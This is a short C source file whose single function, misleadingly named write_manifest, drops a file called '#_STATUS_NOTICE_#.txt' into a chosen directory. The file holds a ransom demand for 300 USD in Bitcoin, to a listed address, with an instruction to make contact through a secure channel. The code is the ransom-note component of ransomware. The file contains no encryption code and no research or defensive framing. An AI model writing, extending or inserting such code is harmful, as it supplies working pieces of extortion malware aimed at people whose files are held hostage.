#include <stdio.h>
#include <string.h>

#define FILENAME "#_STATUS_NOTICE_#.txt"
#define CONTENT "request for 300 USD to Bitcoin address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instruction to contact via secure channel.\n"

int write_manifest(const char *dir_path) {
    if (dir_path == NULL) return -1;

    char full_path[4096];
    int ret = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, FILENAME);
    if (ret < 0 || (size_t)ret >= sizeof(full_path)) {
        return -1;
    }

    FILE *fp = fopen(full_path, "w");
    if (fp == NULL) {
        return -1;
    }

    if (fputs(CONTENT, fp) == EOF) {
        fclose(fp);
        remove(full_path);
        return -1;
    }

    if (fclose(fp) == EOF) {
        remove(full_path);
        return -1;
    }

    return 0;
}